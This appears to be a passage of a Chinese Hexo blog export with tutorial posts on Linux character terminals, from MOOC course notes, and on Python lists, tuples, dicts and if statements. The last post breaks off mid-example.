    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>这是中国大学MOOC中的课程：<a href="https://www.icourse163.org/course/BUPT-1003557006">《linux开发环境及应用》</a>的学习笔记……<span id="more"></span>与其说是笔记，不如说是照抄ppt<code>^_^</code></p>
<h2 id="Linux字符终端"><a href="#Linux字符终端" class="headerlink" title="Linux字符终端"></a>Linux字符终端</h2><h3 id="终端（Terminal）"><a href="#终端（Terminal）" class="headerlink" title="终端（Terminal）"></a>终端（Terminal）</h3><h4 id="UNIX-Linux是多用户系统"><a href="#UNIX-Linux是多用户系统" class="headerlink" title="UNIX/Linux是多用户系统"></a>UNIX/Linux是多用户系统</h4><ul>
<li>主机连接多台字符终端</li>
<li>字符终端作为交互式输入输出设备</li>
</ul>
<h4 id="终端的构成"><a href="#终端的构成" class="headerlink" title="终端的构成"></a>终端的构成</h4><ul>
<li>键盘</li>
<li>显示器</li>
<li>RS232串行通信接口</li>
</ul>
<h4 id="字符终端的历史"><a href="#字符终端的历史" class="headerlink" title="字符终端的历史"></a>字符终端的历史</h4><ul>
<li>英文打字机 typewriter</li>
<li>电传打字机 teletypewriter 简写tty</li>
<li>字符终端，以屏幕代替卷纸打印机（同样称为tty设备）</li>
</ul>
<hr>
<h4 id="主机与终端的连接"><a href="#主机与终端的连接" class="headerlink" title="主机与终端的连接"></a>主机与终端的连接</h4><ul>
<li>主机中的串口卡（硬件）引出多个RS232串口</li>
<li>每个RS232接口通过电缆连接一台终端</li>
<li>RS232电缆的长度限制<ul>
<li>早期要求小于10米</li>
<li>现在可达百米</li>
</ul>
</li>
</ul>
<hr>
<h4 id="终端与主机的功能分工"><a href="#终端与主机的功能分工" class="headerlink" title="终端与主机的功能分工"></a>终端与主机的功能分工</h4><h5 id="终端：主机的输入和输出设备"><a href="#终端：主机的输入和输出设备" class="headerlink" title="终端：主机的输入和输出设备"></a>终端：主机的输入和输出设备</h5><p>终端通过电缆把用户的按键信息送到主机，把主机发来的信息在屏幕上显示</p>
<h5 id="主机：程序和数据的存储及处理"><a href="#主机：程序和数据的存储及处理" class="headerlink" title="主机：程序和数据的存储及处理"></a>主机：程序和数据的存储及处理</h5><p>数据及程序存放在主机的硬盘上，程序的运行由主机完成</p>
<hr>
<h4 id="行律与驱动程序"><a href="#行律与驱动程序" class="headerlink" title="行律与驱动程序"></a>行律与驱动程序</h4><h5 id="驱动程序"><a href="#驱动程序" class="headerlink" title="驱动程序"></a>驱动程序</h5><ul>
<li>不同的硬件需要不同的驱动程序</li>
<li>与行律模块的接口：上行和下行字符流</li>
</ul>
<h5 id="行律的作用"><a href="#行律的作用" class="headerlink" title="行律的作用"></a>行律的作用</h5><ul>
<li>一行内字符的缓冲、回显与编辑，直到按下回车键</li>
<li>数据加工，如：将<code>\n</code>转化为<code>\r\n</code></li>
<li>将<code>Ctrl-C</code>字符转化为中止进程运行的信号</li>
</ul>
<p><img src="/images/4fa6d7c7/0.png" alt="行律与驱动程序"></p>
<hr>
<h4 id="主机与终端之间的通信"><a href="#主机与终端之间的通信" class="headerlink" title="主机与终端之间的通信"></a>主机与终端之间的通信</h4><h5 id="一个程序例子"><a href="#一个程序例子" class="headerlink" title="一个程序例子"></a>一个程序例子</h5><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n<span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Input N: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"N * N = %d\n"</span><span class="token punctuation">,</span> n <span class="token operator">*</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Bye!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="终端按键"><a href="#终端按键" class="headerlink" title="终端按键"></a>终端按键</h5><p>1 7 Backspace 6 Enter</p>
<p><img src="/images/4fa6d7c7/1.png" alt="主机与终端之间的通信"></p>
<hr>
<h4 id="行律功能的调整"><a href="#行律功能的调整" class="headerlink" title="行律功能的调整"></a>行律功能的调整</h4><ul>
<li>程序中通过编程的方法</li>
<li>相关命令stty<ul>
<li>stty erase ^H – 终端默认ctrl + backspace 为删除，这样设置后直接backspace就能删除了。</li>
<li>stty -a  – 以人可读的方式打印所有当前设置</li>
</ul>
</li>
</ul>
<hr>
<h4 id="终端转义序列"><a href="#终端转义序列" class="headerlink" title="终端转义序列"></a>终端转义序列</h4><h5 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h5><p>Esc: ASCII码1B（十进制27，八进制033）</p>
<h5 id="主机发往终端方向数据中的转义序列的功能"><a href="#主机发往终端方向数据中的转义序列的功能" class="headerlink" title="主机发往终端方向数据中的转义序列的功能"></a>主机发往终端方向数据中的转义序列的功能</h5><ul>
<li>控制光标位置、字符颜色、字符大小等等</li>
<li>选择终端的字符集</li>
<li>控制终端上的打印机、刷卡机、磁条器、密码键盘<h5 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h5></li>
<li>Esc[2J 由主机送到终端的四字节序列： 1B 5B 32 4A 功能：清除屏幕</li>
<li>Esc[8A 四字节序列，光标上移8行</li>
<li>Esc[16;8H 七字节序列，光标移动到16行8列</li>
<li>Esc[1;31m 七字节序列，红色字符</li>
</ul>
<hr>
<h4 id="终端类型"><a href="#终端类型" class="headerlink" title="终端类型"></a>终端类型</h4><p>主机根据终端类型，实现相应功能时发送对应的控制码；当终端类型设置不对，可能一些全屏幕操作的软件运行失败</p>
<hr>
<h4 id="仿真终端和虚拟终端"><a href="#仿真终端和虚拟终端" class="headerlink" title="仿真终端和虚拟终端"></a>仿真终端和虚拟终端</h4><h5 id="仿真终端"><a href="#仿真终端" class="headerlink" title="仿真终端"></a>仿真终端</h5><ul>
<li>PC机RS232串口，运行终端仿真软件来仿一个真正的终端设备的功能<br>例如：早期DOS操作系统下的CrossTalk、Windows中的“超级终端”</li>
</ul>
<p>仿真的内容包括实现终端的转义码序列功能</p>
<h5 id="虚拟终端"><a href="#虚拟终端" class="headerlink" title="虚拟终端"></a>虚拟终端</h5><ul>
<li>终端与主机之间的通信由串口替代为一个TCP连接，双向传递字节流</li>
<li>主机与PC通过网络相连，客户端运行telnet、服务器端telnetd，成为Linux的基于TCP通信的虚拟终端</li>
<li>安全终端，在TCP连接上<strong>加密</strong>和<strong>压缩</strong>数据，如：SecureCRT、putty</li>
</ul>
<p><img src="/images/4fa6d7c7/2.png" alt="虚拟终端的字节流"></p>
]]></content>
      <categories>
        <category>MOOC课程学习·Linux开发环境及应用</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（二）·数据结构初探</title>
    <url>/7126db0b/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>这一节，我来简单讲讲python自带的数据结构。<span id="more"></span></p>
<h3 id="列表（list）"><a href="#列表（list）" class="headerlink" title="列表（list）"></a>列表（list）</h3><p>列表是常用的python数据结构，类似于C语言的数组，用来存储多个元素，与之不同的是，C语言的数组中的元素的类型是相同的，而列表可以是不同类型的元素。</p>
<p>创建一个列表可以用一对方括号<code>[]</code>扩起的用逗号<code>,</code>分隔的值（元素）来表示：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>我们可以打印这个列表：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>访问列表中的元素可以用<code>列表名[索引]</code>的方式，就像是操作一个变量一样。例如：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 输出第一个元素</span>
a
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 输出第二个元素</span>
b
<span class="token operator">>></span><span class="token operator">></span> list1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">123</span> <span class="token comment"># 为第一个元素赋值</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> list1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 用元素运算</span>
<span class="token number">124.2</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>注意</strong>：在计算机中，索引一般是从0开始的，也就是说第一个元素的索引是0，依次类推。<strong>“索引”</strong> 还有另一种称呼——<strong>“偏移量”</strong>，一个元素的偏移量就是该元素相对于首元素位置的偏移，如第2个元素相对于首元素的偏移为1，第3个元素的偏移量为2……因为第1个元素相对于第1个元素的偏移量显然0，所以“偏移量”这个称呼更有利于记住<strong>首元素是0号元素</strong>，所以作者更倾向于这个称呼，读者请随意。</p>
<p>访问列表中的元素要注意索引（偏移量）是否越界，比如上面4个元素的列表，如果访问第5个元素将会<strong>报错</strong>：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>
  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>
IndexError<span class="token punctuation">:</span> <span class="token builtin">list</span> index out of <span class="token builtin">range</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面英文的大致意思是：列表的索引超出范围，刚刚创建的列表只有4个元素，不存在第5元素，当然会报错了。</p>
<p>我们可以创建一个空列表：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span>list1 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 或者用 list1 = []</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以添加元素</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> list1 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> list1
<span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> list1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span> <span class="token comment"># 添加元素至列表尾部</span>
<span class="token operator">>></span><span class="token operator">></span> list1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> list1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 嵌套一个列表</span>
<span class="token operator">>></span><span class="token operator">></span> list1
<span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>还可以删除元素：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> list1
<span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">del</span> list1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> list1
<span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> list1<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> list1
<span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们可以用下一节要讲到的<code>for</code>循环语句来遍历列表：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">456.0</span> <span class="token punctuation">]</span>
<span class="token comment"># 循环将列表中的元素赋值给变量e</span>
<span class="token keyword">for</span> e <span class="token keyword">in</span> list1<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出如下：</p>
<pre class="line-numbers language-none"><code class="language-none">hello
123
456.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>


<h3 id="元组（tuple）"><a href="#元组（tuple）" class="headerlink" title="元组（tuple）"></a>元组（tuple）</h3><p>元组的用法和列表类似，列表可以改变，如赋值、添加元素、删除元素等，但是元组不可以改变，所以也就<strong>不能</strong>进行赋值、添加、删除等操作。</p>
<p>元组的用法如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> tuple1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> tuple1
<span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> tuple1 <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">,</span><span class="token number">456</span><span class="token punctuation">,</span><span class="token string">'hello'</span>
<span class="token operator">>></span><span class="token operator">></span> tuple1
<span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">456</span><span class="token punctuation">,</span> <span class="token string">'hello'</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>tuple1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token number">456</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的例子中表明圆括号<code>()</code>不是必要的，其实逗号<code>,</code>才是元组所用的语法符号，但是创建一个空元组的时候用一对圆括号<code>()</code>而不是一个逗号<code>,</code>，代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> tuple1 <span class="token operator">=</span> <span class="token punctuation">,</span> <span class="token comment"># 错误</span>
  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span>
    tuple1 <span class="token operator">=</span> <span class="token punctuation">,</span> <span class="token comment"># 错误</span>
             <span class="token operator">^</span>
SyntaxError<span class="token punctuation">:</span> invalid syntax
<span class="token operator">>></span><span class="token operator">></span> tuple1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 正确</span>
<span class="token operator">>></span><span class="token operator">></span> tuple1
<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> tuple1 <span class="token operator">=</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 也可以这样创建空元组</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>之前将多个变量同时赋值时，有一句<code>a, b, c = 1, 2, &#39;hello&#39;</code>，这其实是把一个元组<code>1, 2, &#39;hello</code>赋值给三个变量<code>a, b, c</code>，像这样把一个元组赋值给多个变量的操作称为 <strong>“解包”</strong>，列表也是可以进行解包的<code>^_^</code>，元组解包操作代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> tuple1
<span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">456</span><span class="token punctuation">,</span> <span class="token string">'hello'</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c <span class="token operator">=</span> tuple1
<span class="token operator">>></span><span class="token operator">></span> a
<span class="token number">123</span>
<span class="token operator">>></span><span class="token operator">></span> b
<span class="token number">456</span>
<span class="token operator">>></span><span class="token operator">></span> c
<span class="token string">'hello'</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>元组同样可以用<code>for</code>语句来遍历：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">tuple1 <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">456.0</span> <span class="token punctuation">)</span>
<span class="token keyword">for</span> e <span class="token keyword">in</span> tuple1<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>输出：</p>
<pre class="line-numbers language-none"><code class="language-none">hello
123
456.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="字典（dict）"><a href="#字典（dict）" class="headerlink" title="字典（dict）"></a>字典（dict）</h3><p>列表按索引访问元素，索引只能是整数，而有时候我们需要一种更方便的方式操作元素，如：电话簿按照姓名查找电话号码，字典按照单词查找意思。像这样用不是整数的“索引”来访问元素的数据结构叫做字典，在C语言中也叫“关联数组”，字典的“索引”称为 <strong>“键”</strong>，<strong>“关键字”</strong>，元素称为 <strong>“值”</strong>，<strong>“键值”</strong>，字典中的每对键和值称为 <strong>“项”</strong>。</p>
<p>创建一个字典的方法是，用一对花括号<code>&#123;&#125;</code>扩起一系列用逗号分隔的键值对（项），其中键值对的表示方法是<code>键:值</code>，即<code>&#123; 键1:值1, 键2:值2, 键3:值3&#125;</code>，代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> dict1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'hello'</span><span class="token punctuation">:</span><span class="token string">'你好'</span><span class="token punctuation">,</span> <span class="token string">'python'</span><span class="token punctuation">:</span><span class="token string">'一门计算机语言'</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> dict1
<span class="token punctuation">&#123;</span><span class="token string">'hello'</span><span class="token punctuation">:</span> <span class="token string">'你好'</span><span class="token punctuation">,</span> <span class="token string">'python'</span><span class="token punctuation">:</span> <span class="token string">'一门计算机语言'</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> dict2 <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>hello<span class="token operator">=</span><span class="token string">'你好'</span><span class="token punctuation">,</span> python<span class="token operator">=</span><span class="token string">'一门计算机语言'</span><span class="token punctuation">)</span> <span class="token comment"># 也可以这样</span>
<span class="token operator">>></span><span class="token operator">></span> dict2
<span class="token punctuation">&#123;</span><span class="token string">'hello'</span><span class="token punctuation">:</span> <span class="token string">'你好'</span><span class="token punctuation">,</span> <span class="token string">'python'</span><span class="token punctuation">:</span> <span class="token string">'一门计算机语言'</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> 
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一些简单的操作：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> dict1<span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span>
<span class="token string">'你好'</span>
<span class="token operator">>></span><span class="token operator">></span> dict1<span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">]</span>
<span class="token string">'一门计算机语言'</span>
<span class="token operator">>></span><span class="token operator">></span> dict1<span class="token punctuation">[</span><span class="token string">'abc'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">123</span> <span class="token comment"># 创建一个项</span>
<span class="token operator">>></span><span class="token operator">></span> dict1
<span class="token punctuation">&#123;</span><span class="token string">'hello'</span><span class="token punctuation">:</span> <span class="token string">'你好'</span><span class="token punctuation">,</span> <span class="token string">'python'</span><span class="token punctuation">:</span> <span class="token string">'一门计算机语言'</span><span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">:</span> <span class="token number">123</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">del</span> dict1<span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span> <span class="token comment"># 删除键为'hello'的项</span>
<span class="token operator">>></span><span class="token operator">></span> dict1
<span class="token punctuation">&#123;</span><span class="token string">'python'</span><span class="token punctuation">:</span> <span class="token string">'一门计算机语言'</span><span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">:</span> <span class="token number">123</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> dict1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment"># 空字典， 或者用 dict1 = dict()</span>
<span class="token operator">>></span><span class="token operator">></span> dict1
<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>也可用<code>for</code>语句遍历字典，但是<code>for</code>语句遍历的是字典的键，得到了键自然就可以得到值：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">dict1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'hello'</span><span class="token punctuation">:</span><span class="token string">'你好'</span><span class="token punctuation">,</span> <span class="token string">'python'</span><span class="token punctuation">:</span><span class="token string">'一门计算机语言'</span><span class="token punctuation">&#125;</span>
<span class="token keyword">for</span> k <span class="token keyword">in</span> dict1<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span><span class="token string">' =>'</span><span class="token punctuation">,</span> dict1<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>输出如下：</p>
<pre class="line-numbers language-none"><code class="language-none">hello  &#x3D;&gt; 你好
python  &#x3D;&gt; 一门计算机语言<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<hr>
<p>本节只是简单了解python中常用的数据结构，不作深入探究，同时引出循环语句，接下来详细介绍编程中十分重要的语法——循环语句……</p>
]]></content>
      <categories>
        <category>python教程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（二）·条件语句</title>
    <url>/f4f7d8a8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>条件语句一般用来判断给定的条件是否成立，根据结果来执行不同的代码，也就是说，有了条件语句，才可以根据不同的情况做不同的事，从而控制程序的流程。<span id="more"></span></p>
<h3 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h3><p>前面说到数据类型的时候，其中有一种叫 <strong>“布尔”</strong> 的类型，对于读者们来说应该有一点困惑的，作者当初接触到布尔类型的时候也想过：</p>
<blockquote>
<p>“这东西能有什么用？”</p>
</blockquote>
<p>其实，布尔类型和条件语句是密不可分的，判断一个条件是否成立，就是这个条件是“真”（True）还是“假”（False）。</p>
<h3 id="关键字-if"><a href="#关键字-if" class="headerlink" title="关键字-if"></a>关键字-if</h3><p><code>if</code>是python的一个关键字，我们的条件语句就是<code>if</code>语句，基本语法格式如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 代码</span>
<span class="token keyword">if</span> condition <span class="token punctuation">:</span>
    <span class="token comment"># 在这里写下条件condition成立要执行的代码</span>
<span class="token comment"># 代码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h4 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h4><p>冒号<code>:</code>表示一个<strong>代码块</strong>的开始，代码块里可以有多行语句，一个代码块被视为一个整体，可以认为一个代码块就是一条语句，<code>if</code>语句中的条件（上面的<code>condition</code>）成立，就执行后面的一个代码块。</p>
<p>在C语言中，代码块是花括号括起的：<code>&#123;代码块&#125;</code>。而在python中，代码块是以<strong>缩进</strong>为准的，同一个代码块的行首空格数必须<strong>相同</strong>，否则执行时就会报错。python并不强制要求缩进的空格数量，官方建议用4个空格来作为代码块的缩进，也有人用制表符<code>tab</code>来缩进代码，这两种选择是网络上的两大对立阵营。其实用哪种也没必要纠结，按照官方的来就好了。</p>
<blockquote>
<p>“但是每次都打那么多空格很费劲啊！”</p>
</blockquote>
<p>不用担心，一般的编辑器都可以配置<code>tab</code>自动转换成指定数量空格，想要4个空格的时候，只需按下按键<kbd>Tab</kbd>。</p>
<hr>
<p>说多无益，下面来个例子（**注意，不要忘了写冒号<code>:</code>）：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"程序开始"</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token number">10</span> <span class="token operator">></span> <span class="token number">3</span> <span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"if代码块开始"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"10是大于3的"</span><span class="token punctuation">)</span>
